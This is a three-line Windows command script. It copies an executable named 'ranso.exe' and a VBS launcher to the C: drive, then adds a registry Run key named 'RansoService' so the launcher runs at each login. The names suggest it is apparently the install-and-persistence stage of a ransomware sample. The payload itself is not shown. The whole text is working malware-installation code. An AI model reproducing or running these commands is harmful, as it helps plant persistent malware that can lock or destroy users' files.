xcopy ranso.exe C:/
xcopy background_start.vbs C:/
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "RansoService" /t REG_SZ /F /D "C:\background_start.vbs"

